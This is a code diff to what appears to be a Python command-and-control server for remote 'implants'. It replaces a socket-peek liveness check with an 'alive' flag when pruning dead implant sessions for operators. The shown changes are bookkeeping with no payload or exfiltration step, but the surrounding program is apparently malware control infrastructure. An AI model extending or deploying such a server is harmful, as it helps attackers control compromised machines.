@@ -108,6 +108,7 @@ class ImplantSession(object):
         self.imp_pub = imp_pub
         self.info = info
         self.task_queue = queue.Queue()
+        self.alive = True
 
     def _push(self, command, payload):
         req = {
@@ -195,6 +196,7 @@ def _handle_implant(conn, addr):
         with _sessions_lock:
             dead = [k for k, v in list(_sessions.items()) if v.conn is conn]
             for k in dead:
+                _sessions[k].alive = False
                 _sessions.pop(k, None)
                 log.info("- IMPLANT  %s  disconnected", k)
         conn.close()
@@ -225,27 +227,10 @@ def _handle_operator(conn, addr):
 
             if action == "LIST":
                 with _sessions_lock:
-                    dead = []
-                    for iid, s in list(_sessions.items()):
-                        try:
-                            s.conn.settimeout(0)
-                            ret = s.conn.recv(1, socket.MSG_PEEK)
-                            if ret == b"":
-                                dead.append(iid)
-                        except ssl.SSLWantReadError:
-                            pass  # no data but TLS connection alive
-                        except BlockingIOError:
-                            pass  # no data but connection alive
-                        except Exception:
-                            dead.append(iid)
-                        finally:
-                            try:
-                                s.conn.settimeout(None)
-                            except Exception:
-                                pass
+                    dead = [iid for iid, s in list(_sessions.items()) if not s.alive]
                     for iid in dead:
                         _sessions.pop(iid, None)
-                        log.info("- IMPLANT  %s  pruned (dead socket)", iid)
+                        log.info("- IMPLANT  %s  pruned (dead)", iid)
                     result = {
                         "status": "ok",
                         "implants": {iid: s.info for iid, s in _sessions.items()},
